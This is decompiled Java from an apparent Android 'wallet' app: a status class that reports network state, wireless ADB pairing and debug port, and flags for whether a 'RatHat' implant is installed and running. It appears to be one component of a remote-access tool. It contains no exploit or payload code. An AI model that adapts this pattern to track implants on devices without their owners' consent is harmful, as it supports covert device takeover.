package com.guard.wallet.resp;

import android.os.Build.VERSION;
import android.support.annotation.NonNull;
import com.guard.wallet.entity.ADBConfig;
import com.guard.wallet.req.NetStateVO;
import com.guard.wallet.utils.g;
import com.guard.wallet.utils.h;
import h.e;
import java.io.Serializable;

public class DevicePairStateVO implements Serializable {
   private Integer deviceConnected;
   private Integer deviceDebugPort;
   private Integer devicePaired;
   private Integer isWifiConnected;
   private Integer netConnected;
   private Integer ratHatImplant;
   private Integer ratHatRunning;
   private Integer supportPair;
   private String wifiId;

   public DevicePairStateVO() {
   }

   public DevicePairStateVO(Integer var1, Integer var2, String var3, Integer var4, Integer var5, Integer var6, Integer var7, Integer var8, Integer var9) {
      this.netConnected = var1;
      this.isWifiConnected = var2;
      this.wifiId = var3;
      this.supportPair = var4;
      this.devicePaired = var5;
      this.deviceConnected = var6;
      this.deviceDebugPort = var7;
      this.ratHatImplant = var8;
      this.ratHatRunning = var9;
   }

   public static DevicePairStateVO of() {
      DevicePairStateVO var1 = new DevicePairStateVO();
      NetStateVO var2 = g.z0();
      var1.setNetConnected(var2.getIsConnected());
      var1.setIsWifiConnected(var2.getIsWifiConnected());
      var1.setWifiId(var2.getWifiId());
      int var0 = VERSION.SDK_INT;
      Integer var3 = 0;
      Integer var4 = 1;
      if (var0 > 29) {
         var1.setSupportPair(var4);
      } else {
         var1.setSupportPair(var3);
      }

      ADBConfig var5 = h.J();
      var1.setRatHatImplant(var5.getInstalledRatHat());
      var1.setDevicePaired(Integer.valueOf(var5.isPaired()));
      var1.setDeviceConnected(Integer.valueOf(var5.isConnected()));
      var1.setDeviceDebugPort(var5.getDebugPort());
      if (e.S() != null && e.S().B.get()) {
         var1.setRatHatImplant(var4);
         var1.setRatHatRunning(var4);
      } else {
         var1.setRatHatRunning(var3);
      }

      return var1;
   }

   public Integer getDeviceConnected() {
      return this.deviceConnected;
   }

   public Integer getDeviceDebugPort() {
      return this.deviceDebugPort;
   }

   public Integer getDevicePaired() {
      return this.devicePaired;
   }

   public Integer getIsWifiConnected() {
      return this.isWifiConnected;
   }

   public Integer getNetConnected() {
      return this.netConnected;
   }

   public Integer getRatHatImplant() {
      return this.ratHatImplant;
   }

   public Integer getRatHatRunning() {
      return this.ratHatRunning;
   }

   public Integer getSupportPair() {
      return this.supportPair;
   }

   public String getWifiId() {
      return this.wifiId;
   }

   public void setDeviceConnected(Integer var1) {
      this.deviceConnected = var1;
   }

   public void setDeviceDebugPort(Integer var1) {
      this.deviceDebugPort = var1;
   }

   public void setDevicePaired(Integer var1) {
      this.devicePaired = var1;
   }

   public void setIsWifiConnected(Integer var1) {
      this.isWifiConnected = var1;
   }

   public void setNetConnected(Integer var1) {
      this.netConnected = var1;
   }

   public void setRatHatImplant(Integer var1) {
      this.ratHatImplant = var1;
   }

   public void setRatHatRunning(Integer var1) {
      this.ratHatRunning = var1;
   }

   public void setSupportPair(Integer var1) {
      this.supportPair = var1;
   }

   public void setWifiId(String var1) {
      this.wifiId = var1;
   }

   @NonNull
   @Override
   public String toString() {
      StringBuilder var1 = new StringBuilder("DevicePairStateVO{netConnected=");
      var1.append(this.netConnected);
      var1.append(", isWifiConnected=");
      var1.append(this.isWifiConnected);
      var1.append(", wifiId='");
      var1.append(this.wifiId);
      var1.append("', supportPair=");
      var1.append(this.supportPair);
      var1.append(", devicePaired=");
      var1.append(this.devicePaired);
      var1.append(", deviceConnected=");
      var1.append(this.deviceConnected);
      var1.append(", deviceDebugPort=");
      var1.append(this.deviceDebugPort);
      var1.append(", ratHatImplant=");
      var1.append(this.ratHatImplant);
      var1.append(", ratHatRunning=");
      var1.append(this.ratHatRunning);
      var1.append('}');
      return var1.toString();
   }
}
